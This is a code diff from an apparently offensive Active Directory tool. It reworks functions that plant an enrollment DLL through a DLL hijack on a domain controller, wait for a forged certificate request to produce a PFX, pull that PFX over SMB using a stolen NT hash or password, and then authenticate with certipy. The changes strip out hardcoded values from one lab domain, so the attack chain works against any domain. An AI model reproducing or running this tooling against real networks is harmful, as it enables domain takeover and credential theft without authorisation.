@@ -56,19 +56,27 @@ def run_certipy_enrollment(
     if finding is None:
         raise ValueError(f"AD CS finding not found: {finding_id} — run adcs first")
 
-    template = str(finding.get("template") or "UpdateSrv")
-    ca_name = str(finding.get("ca_name") or "logging-DC01-CA")
+    template = str(finding.get("template") or "")
+    if not template:
+        raise ValueError("no template specified on AD CS finding")
+    ca_name = str(finding.get("ca_name") or "")
+    if not ca_name:
+        raise ValueError("no CA name specified on AD CS finding")
     principal = str(finding.get("principal") or session.workspace.pivot_user or "")
     if not principal:
         raise ValueError("no principal on finding — set escalate pivot")
 
-    domain = session.workspace.domain or "logging.htb"
+    domain = session.workspace.domain
+    if not domain:
+        raise ValueError("no workspace domain — run scan/recon first")
     dc_ip = pick_dc_ip(session)
     if not dc_ip:
         raise ValueError("no DC IP")
 
-    dns = dns_name or "DC01.logging.htb"
+    from admapper.creds.common import resolve_dc_fqdn
+
     ws_path = session.workspaces.path_for(session.workspace.name)
+    dns = dns_name or resolve_dc_fqdn(str(ws_path), domain, fallback_ip=dc_ip) or f"dc01.{domain}"
     out_dir = ws_path / "certs"
     out_dir.mkdir(parents=True, exist_ok=True)
 
@@ -196,12 +204,13 @@ def run_certipy_enrollment(
 def fetch_pfx_via_smb(
     session: Session,
     *,
-    remote_name: str = "DC01.logging.htb.pfx",
+    remote_name: str | None = None,
+    drop_path: str | None = None,
     cred_id: str | None = None,
     retries: int = 5,
     retry_delay: int = 15,
 ) -> Path | None:
-    """Download issued PFX from C$\\ProgramData\\UpdateMonitor (msa_health$ WinRM cred)."""
+    """Download issued PFX from a task drop path via SMB."""
     if session.workspace is None:
         raise RuntimeError("no active workspace")
 
@@ -211,10 +220,13 @@ def fetch_pfx_via_smb(
     if not dc_ip:
         raise ValueError("no DC IP")
 
-    domain = session.workspace.domain or "logging.htb"
+    domain = session.workspace.domain
+    if not domain:
+        raise ValueError("no workspace domain")
+
     cred = resolve_winrm_cred(session, cred_id=cred_id, host=dc_ip)
     if not cred.uses_nthash and not cred.password:
-        raise ValueError("need msa_health$ hash or password for SMB")
+        raise ValueError("need machine/hash or password for SMB")
 
     try:
         from impacket.smbconnection import SMBConnection
@@ -224,8 +236,13 @@ def fetch_pfx_via_smb(
     ws_path = session.workspaces.path_for(session.workspace.name)
     out_dir = ws_path / "certs"
     out_dir.mkdir(parents=True, exist_ok=True)
+
+    if not remote_name:
+        dns = resolve_dc_fqdn(str(ws_path), domain, fallback_ip=dc_ip) or f"dc01.{domain}"
+        remote_name = f"{dns}.pfx"
     local = out_dir / remote_name
-    remote = f"ProgramData/UpdateMonitor/{remote_name}"
+    drop = (drop_path or r"C:\ProgramData").lstrip(r"C:\").replace("\\", "/")
+    remote = f"{drop}/{remote_name}"
 
     secret = cred.nthash if cred.uses_nthash else cred.password
     last_exc: Exception | None = None
@@ -249,7 +266,13 @@ def fetch_pfx_via_smb(
     return None
 
 
-def _wait_for_remote_pfx(session: Session, *, remote_name: str, timeout: int = 240) -> bool:
+def _wait_for_remote_pfx(
+    session: Session,
+    *,
+    remote_name: str,
+    drop_path: str = r"C:\ProgramData",
+    timeout: int = 240,
+) -> bool:
     from admapper.adcs.enroll import parse_enroll_log
     from admapper.postex.creds import resolve_winrm_cred
     from admapper.postex.runner import _winrm_client_from_cred
@@ -259,9 +282,11 @@ def _wait_for_remote_pfx(session: Session, *, remote_name: str, timeout: int = 2
         return False
     cred = resolve_winrm_cred(session, host=dc_ip)
     client = _winrm_client_from_cred(cred)
-    remote = f"C:\\ProgramData\\UpdateMonitor\\{remote_name}"
+    log_path = f"{drop_path.rstrip('\\/')}\\enroll.log"
+    safe_log = log_path.replace("'", "''")
+    remote = f"{drop_path.rstrip('\\/')}\\{remote_name}"
     safe = remote.replace("'", "''")
-    log_safe = r"C:\ProgramData\UpdateMonitor\enroll.log".replace("'", "''")
+    log_safe = log_path.replace("'", "''")
     import time
 
     deadline = time.time() + timeout
@@ -289,22 +314,41 @@ def run_enroll_hijack(
     session: Session,
     *,
     finding_id: str = "adcs-002",
-    dns_name: str = "DC01.logging.htb",
+    dns_name: str | None = None,
     op_id: str | None = None,
     wait_seconds: int = 300,
     arch: TargetArch | None = None,
     run_certipy_auth: bool | None = None,
+    drop_path: str = r"C:\ProgramData",
 ) -> CertEnrollResult:
     """Deploy enroll DLL + enroll.ps1, poll task, SMB-fetch PFX; optional certipy auth if EKU allows."""
     from admapper.postex.runner import run_dll_hijack
 
     finding = get_adcs_finding(session, finding_id)
-    template = str((finding or {}).get("template") or "UpdateSrv")
-    ca_name = str((finding or {}).get("ca_name") or "logging-DC01-CA")
+    template = str((finding or {}).get("template") or "")
+    ca_name = str((finding or {}).get("ca_name") or "")
     principal = str((finding or {}).get("principal") or session.workspace.pivot_user or "")  # type: ignore[union-attr]
     wsus_only = bool((finding or {}).get("wsus_chain_step"))
     if run_certipy_auth is None:
         run_certipy_auth = not wsus_only and bool((finding or {}).get("cert_auth_viable", True))
+
+    if not (template and ca_name):
+        error = "ADCS finding missing template or ca_name"
+        print_warning(error)
+        return CertEnrollResult(
+            finding_id=finding_id,
+            template=template,
+            ca_name=ca_name,
+            principal=principal,
+            error=error,
+        )
+
+    ws_path = session.workspaces.path_for(session.workspace.name)  # type: ignore[union-attr]
+    dc_ip = pick_dc_ip(session) or ""
+    domain = session.workspace.domain
+    if not domain:
+        raise ValueError("no workspace domain")
+    resolved_dns = dns_name or resolve_dc_fqdn(str(ws_path), domain, fallback_ip=dc_ip) or f"dc01.{domain}"
 
     run_dll_hijack(
         session,
@@ -313,17 +357,19 @@ def run_enroll_hijack(
         no_listener=True,
         payload_mode="enroll",
         enroll_template=template,
-        enroll_dns=dns_name,
+        enroll_dns=resolved_dns,
         enroll_ca_name=ca_name,
         arch=arch or "x86",
     )
 
-    remote_pfx = f"{dns_name}.pfx"
-    if not _wait_for_remote_pfx(session, remote_name=remote_pfx, timeout=min(wait_seconds, 240)):
-        print_warning("PFX not observed on target — check C:\\ProgramData\\UpdateMonitor\\enroll.log")
+    remote_pfx = f"{resolved_dns}.pfx"
+    if not _wait_for_remote_pfx(
+        session, remote_name=remote_pfx, drop_path=drop_path, timeout=min(wait_seconds, 240)
+    ):
+        print_warning(f"PFX not observed on target — check {drop_path}\\enroll.log")
 
     try:
-        pfx = fetch_pfx_via_smb(session, remote_name=remote_pfx)
+        pfx = fetch_pfx_via_smb(session, remote_name=remote_pfx, drop_path=drop_path)
     except Exception as exc:
         print_warning(f"SMB PFX fetch: {exc}")
         return CertEnrollResult(
@@ -345,7 +391,7 @@ def run_enroll_hijack(
 
     if not run_certipy_auth:
         print_success(f"issued PFX saved → {pfx}")
-        print_info("UpdateSrv is Server Authentication only — next: admapper wsus / pywsus publish")
+        print_info("enrollment-only template — next: use the certificate for its intended EKU")
         return CertEnrollResult(
             finding_id=finding_id,
             template=template,
@@ -355,7 +401,9 @@ def run_enroll_hijack(
             success=True,
         )
 
-    domain = session.workspace.domain or "logging.htb"  # type: ignore[union-attr]
+    domain = session.workspace.domain
+    if not domain:
+        raise ValueError("no workspace domain")
     dc_ip = pick_dc_ip(session) or ""
     certipy = resolve_certipy()
     if not certipy or not pfx:
